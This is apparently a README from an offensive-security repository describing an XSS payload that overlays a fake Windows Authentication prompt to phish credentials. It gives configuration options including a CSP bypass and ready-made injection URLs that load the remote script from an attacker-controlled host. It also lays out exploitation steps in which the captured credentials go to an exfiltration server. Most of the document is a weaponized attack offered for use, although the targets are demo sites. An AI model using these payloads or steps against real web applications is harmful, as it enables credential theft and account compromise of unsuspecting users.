# [unauthn] Windows Authentication Prompt (Phish)

<p align="justify">This payload adds HTML code as an overlay to the target web page (containing the XSS vulnerability). The code displays the dreaded Windows Authentication prompt popup window. The overlay creates the illusion that the operating system spawned the prompt. Once they encounter such an authentication prompt, most users have a (proven) tendency to blindly provide it credentials (which contributes to a higher success rate of such phishing attacks).<p>

Typical use-case scenarios:
* external network perspective (Internet)
  * public web application which uses Windows Authentication (e.g. Outlook Web Access) without 2FA
* internal network perspective (LAN)
  * Windows Active Directory environments (**NOTE**: no web application requirements)

The payload (`winph.js`) supports the following options:

* no CSP bypass - issue AJAX request (i.e. client-side redirect)

  ```
  ...
  let bypassCSP = false;
  ...
  ```

* CSP bypass - issue hard redirect (uses `redir.php`; i.e. server-side redirect)

  ```
  ...
  let bypassCSP = true;
  ...
  ```

* run payload once - sets a cookie, once payload is executed; used to prevent further payload executions

  ```
  ...
  let runOnce = true;
  ...
  ```

## Live Example

* *(live example - OWASP juice shop - reflected XSS)*

    https://preview.owasp-juice.shop/#/search?q=%3Cimg%20src%20onerror%3D%22with(document)body.appendChild(createElement(%27script%27)).src%3D%27%2F%2Fcdn.jsdelivr.net%2Fgh%2Flighthouseitsecurity%2FweaponizedXSS%2FWindowsPhishing%2FwinphLiveExample.js%27%3B%22%3E

## Test Environment

### Web Browsers (20250426)

* [x] Mozilla Firefox 137.0.2 (64-bit)
* [x] Google Chrome 135.0.7049.115 (64-bit)
* [x] Microsoft Edge 135.0.3179.98 (64-bit)

### Vulnerable Page

http://testphp.vulnweb.com/listproducts.php?cat=XSS_PAYLOAD_HERE

## Exploitation Steps

1. [setup exploit] change payload variable values (`winph.js`; `redir.php`)

    `attWsPhishPath` - exfiltration web server URL (i.e. scheme + FQDN + port + path; use trailing slash)

    `bypassCSP` - use/do not use CSP bypass (true/false)

    `runOnce` - execute payload only once (true/false)

    `url` - exfiltration web server URL

2. [setup exploit] setup web server (to serve the payload/redirector)

3. [social engineering attack] victim user clicks link

    ```
    http://testphp.vulnweb.com/listproducts.php?cat=<script src=http://192.168.5.5/winph.js></script>
    ```

    * **NOTES**:
      * `testphp.vulnweb.com` - target site
      * `192.168.5.5` - web server hosting the payload

4. [social engineering attack] victim user authenticates

    *(attacker obtains credentials)*

5. [post exploit] attacker leverages obtained credentials (scenario dependent)

## Screenshots

* **NOTE**: the screenshot covers steps 1 to 4 from the "Exploitation Steps" chapter

<p align="center">
  <kbd>
    <picture>
      <source media="" srcset="https://github.com/lighthouseitsecurity/weaponizedXSS/raw/main/WindowsPhishing/screenshots/Windows_phish_-_cred_exfil_-_1-1.png">
      <img src="https://github.com/lighthouseitsecurity/weaponizedXSS/raw/main/WindowsPhishing/screenshots/Windows_phish_-_cred_exfil_-_1-1.png">
    </picture>
  </kbd>
</p>

* [web browser rendering] Mozilla FireFox

<p align="center">
  <kbd>
    <picture>
      <source media="" srcset="https://github.com/lighthouseitsecurity/weaponizedXSS/raw/main/WindowsPhishing/screenshots/Windows_phish_-_web_browser_rendering_-_Mozilla_FireFox_-_1-1.png">
      <img src="https://github.com/lighthouseitsecurity/weaponizedXSS/raw/main/WindowsPhishing/screenshots/Windows_phish_-_web_browser_rendering_-_Mozilla_FireFox_-_1-1.png">
    </picture>
  </kbd>
</p>

* [web browser rendering] Google Chrome

<p align="center">
  <kbd>
    <picture>
      <source media="" srcset="https://github.com/lighthouseitsecurity/weaponizedXSS/raw/main/WindowsPhishing/screenshots/Windows_phish_-_web_browser_rendering_-_Google_Chrome_-_1-1.png">
      <img src="https://github.com/lighthouseitsecurity/weaponizedXSS/raw/main/WindowsPhishing/screenshots/Windows_phish_-_web_browser_rendering_-_Google_Chrome_-_1-1.png">
    </picture>
  </kbd>
</p>

* [web browser rendering] Microsoft Edge

<p align="center">
  <kbd>
    <picture>
      <source media="" srcset="https://github.com/lighthouseitsecurity/weaponizedXSS/raw/main/WindowsPhishing/screenshots/Windows_phish_-_web_browser_rendering_-_Microsoft_Edge_-_1-1.png">
      <img src="https://github.com/lighthouseitsecurity/weaponizedXSS/raw/main/WindowsPhishing/screenshots/Windows_phish_-_web_browser_rendering_-_Microsoft_Edge_-_1-1.png">
    </picture>
  </kbd>
</p>

## Video

https://github.com/user-attachments/assets/73fbd395-1458-4a41-a1df-47dd6d58cf23
